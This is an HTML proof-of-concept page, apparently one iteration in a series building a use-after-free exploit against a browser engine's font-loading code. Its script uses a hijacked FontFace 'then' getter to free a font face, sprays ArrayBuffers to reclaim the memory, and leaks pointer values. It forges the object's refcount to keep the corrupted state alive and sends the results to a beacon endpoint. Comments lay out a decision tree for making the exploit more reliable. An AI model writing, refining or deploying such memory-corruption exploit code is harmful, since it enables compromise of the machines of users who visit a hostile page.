<!--
  p672: rc-sweep step 1 — p671 EXACT base (benign seed float @+0x44, keepspray
  via __sprayAlive, OBS cross-round telemetry, opCount clamp harmless,
  batch-only beacons, DUMP1/DUMP2, ROUNDS=8, all fields) with ONE delta:
  RCINF writes rc = 2 instead of 0x7FFFFFF0.

  THE PUZZLE TABLE (one variable each):
    p669: no LATE intervention ....... R1 passes (beacon fires), death R2
    p670: LATE writes m_table = 0 .... death PRE-R1 (between +3500 and +3900)
    p671: LATE writes rc = 0x7FFFFFF0  death PRE-R1 (same window)
  Both interventions made death EARLIER. Two readings:
    OPTIMISTIC: rc is a LIVE control point read during the round-1 window
      (style insert -> fonts.add -> fonts.load of beginRound). rc=1 walks a
      benign path; 0x7FFFFFF0 takes a different/fatal branch (or the write
      itself races a reader). An intermediate value (2) may block the
      destructor (deref 2->1, never 0) while staying on the normal path.
    PESSIMISTIC: ANY post-LATE write to the lane in the window kills
      (timing/race), value irrelevant.
  Timing window analysis: R0LATE + RCINF at ~+3500; round-1 beginRound at
  +3750 (style insert, FontFace construct, fonts.add, void loaded,
  fonts.load); R1 analyze at +3900. p670/p671 died between +3500 and +3900
  => inside beginRound's font machinery — the first engine code to touch
  the FontFaceSet after our write.

  SOURCE HUNT RESULT (see P672_NOTES.md for full table): no add/load path
  reads refCount()/hasOneRef() on CSSFontFace (the only hasOneRef is on
  PendingPromise, FontFaceSet.cpp:251; purgeable() reads cssConnection() &&
  m_mayBePurged only, CSSFontFace.cpp:762-764). The build-time removal chain
  (CSSFontSelector::buildStarted :130-147 / buildCompleted :149-168 ->
  CSSFontFaceSet::remove :250-281 with Ref protect) does ref/deref on faces
  it removes, but the forged face left m_faces at round-0's getter. The
  exact reader of rc/table in the window is NOT statically identifiable —
  this sweep is the empirical discriminator.

  RCINF RULE: on each LATE, after OBS, for every tracked hit lane:
    if rc !== 2: write +0x00 = 2 (u32), +0x04 = 0; emit 'RCINF r<N> rcwas=<v>'.
  Re-arming semantics: a LATER RCINF emission means rc drifted (engine
  ref'd or deref'd through our buffer) — the emission IS the natural
  experiment telling us the direction.

  Decision tree:
    (a) R1 beacon escapes (+ maybe further) => OPTIMISTIC confirmed: rc is
        live control; sweep rc=3/4 next; target end-r8 with tuned value.
    (b) death PRE-R1 again (p670/p671 phenotype) => PESSIMISTIC: any LATE
        write kills — move the intervention to EARLY (+150ms, right after
        the engine write lands, before any teardown) or accept p669 as the
        best base and pivot to R2 substep beacons (p665 pattern).
    (c) NEW phenotype (death at R1 analyze or R1.5) => rc=2 partial: the
        destructor block helped but something else engages mid-round.

  Beacon: P672-.  CRASH_CLASS: MEDIUM.
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p672</title></head>
<body>p672: rc-sweep rc=2 (size-seed, r8)
<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
<script>
(function() {
'use strict';
var L = document.getElementById('log');
var bQ = [];
function emit(tag, msg) {
  var s = tag + (msg ? ' ' + msg : '');
  L.textContent += s + '\n';
  bQ.push(s);
}
function flush() {
  while (bQ.length) {
    var b = bQ.splice(0, 2).join('|');
    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P672-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
  }
}
window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

emit('START', 'rcsweep2 r8');
flush();

var ROUNDS = 8;
var round = 0;
var results = [];
var gfired = -1;

var sty = null, ff = null;
var armed = false;
var spray = [];
window.__sprayAlive = [];
var snap1 = null;

var round0Lane = null;
var round0T = '';
var hitLanes = [];

function seedLane(dv, i) {
  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
}

Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (!armed) return undefined;
    armed = false;
    gfired = round;
    try { sty.remove(); } catch(e) {}
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    spray = window.__sprayAlive[round] = [];
    for (var i = 0; i < 24; i++) {
      var ab = new ArrayBuffer(192);
      var dv = new DataView(ab);
      seedLane(dv, i);
      spray.push(dv);
    }
    return undefined;
  },
  set: function() {}
});

function dumpLane(dv) {
  var out = [];
  for (var off = 0; off <= 0xB8; off += 8) {
    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
  }
  return out.join(',');
}

function scanHit() {
  for (var i = 0; i < spray.length; i++) {
    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
  }
  return -1;
}

function obsR0Lane() {
  if (!round0Lane) return;
  try {
    var tNow = hex32(round0Lane.getUint32(0x5C, true)) + hex32(round0Lane.getUint32(0x58, true));
    emit('OBS r' + round, 'opc=' + round0Lane.getUint32(0x60, true) +
         ' rc=' + round0Lane.getUint32(0x00, true) +
         ' st=' + round0Lane.getUint8(0x82) +
         ' Tsame=' + (tNow === round0T ? 'y' : 'n'));
  } catch(e) { emit('OBS r' + round, 'ERR ' + String(e).slice(0,60)); }
}

/* RC-SWEEP: hold rc at exactly 2 — blocks destructor (deref 2->1) while
   staying on the normal multi-ref life path. Re-arms on drift; each
   re-emission reveals engine ref/deref through our buffer. */
function rcSweep() {
  for (var k = 0; k < hitLanes.length; k++) {
    try {
      var rc = hitLanes[k].dv.getUint32(0x00, true);
      if (rc !== 2) {
        emit('RCINF r' + round, 'lane=' + hitLanes[k].tag + ' rcwas=' + rc);
        hitLanes[k].dv.setUint32(0x00, 2, true);
        hitLanes[k].dv.setUint32(0x04, 0, true);
      }
    } catch(e) { emit('RCINF r' + round, 'ERR lane=' + hitLanes[k].tag); }
  }
}

function clampLanes() {
  for (var k = 0; k < hitLanes.length; k++) {
    try {
      var v = hitLanes[k].dv.getUint32(0x60, true);
      if (v !== 0) {
        hitLanes[k].dv.setUint32(0x60, 0, true);
        emit('CLAMP r' + round, 'lane=' + hitLanes[k].tag + ' opc-was=' + v);
      }
    } catch(e) {}
  }
}

function trackHit(hit) {
  var dv = spray[hit];
  if (round === 0) round0Lane = dv;
  hitLanes.push({ tag: 'r' + round, dv: dv });
}

function beginRound() {
  sty = document.createElement('style');
  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(sty);
  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(ff);
  void ff.loaded;
  window.__facesAlive = window.__facesAlive || [];
  window.__facesAlive.push(ff);
  armed = true;
  document.fonts.load('1em f' + round + ', s' + round, 'AB');
  setTimeout(analyzeEarly, 150);
  setTimeout(analyzeLate, 3500);
}

function analyzeEarly() {
  try {
    obsR0Lane();
    var hit = scanHit();
    if (hit < 0) {
      emit('R' + round, 'MISS gf=' + gfired);
      results.push({ r: round, lane: -1, t: '-', w: '-' });
    } else {
      var dv = spray[hit];
      snap1 = dumpLane(dv);
      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
      var dirtyNear = 0;
      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
      }
      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
      if (round === 0) round0T = hex32(tHi) + hex32(tLo);
      trackHit(hit);
      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
           ' gf=' + gfired + ' dirtyNear=' + dirtyNear +
           ' seed=' + dv.getFloat32(0x44, true).toFixed(3));
      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
    }
    flush();
  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
}

function analyzeLate() {
  try {
    obsR0Lane();
    var hit = scanHit();
    if (hit >= 0 && spray.length) {
      var dv = spray[hit];
      var snap2s = dumpLane(dv);
      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
           ' rc=' + dv.getUint32(0x00, true) +
           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
    } else {
      emit('R' + round + 'LATE', 'alive (miss-round)');
    }
    rcSweep();
    clampLanes();
    flush();
    round++;
    if (round < ROUNDS) {
      gfired = -1;
      setTimeout(beginRound, 250);
    } else {
      var ts = {}, lanes = [];
      for (var k = 0; k < results.length; k++) {
        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
        lanes.push(results[k].lane);
      }
      var keys = Object.keys(ts);
      emit('SUMMARY', 'rcsweep2 rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
      emit('ALIVE', 'end-r8-rcsweep2');
      flush();
    }
  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
}

setTimeout(beginRound, 50);

})();
</script>
</body></html>
